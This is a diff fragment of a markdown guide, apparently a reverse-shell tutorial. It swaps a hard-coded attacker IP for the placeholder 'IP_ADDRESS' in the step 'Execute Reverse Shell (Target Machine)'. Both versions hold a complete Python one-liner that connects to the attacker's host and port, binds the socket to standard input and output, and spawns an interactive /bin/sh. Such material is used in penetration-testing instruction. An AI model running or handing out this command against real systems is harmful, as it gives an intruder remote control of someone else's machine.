@@ -25,10 +25,10 @@ Replace `1234` with your desired port if necessary.
 
 ## Step 2: Execute Reverse Shell (Target Machine)
 
-Run this command on the target machine, replacing `10.23.103.176` with your attacker machine's IP and `1234` with your chosen port number:
+Run this command on the target machine, replacing `IP_ADDRESS` with your attacker machine's IP and `1234` with your chosen port number:
 
 ```bash
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.23.103.176",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ADDRESS",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 ### Explanation:
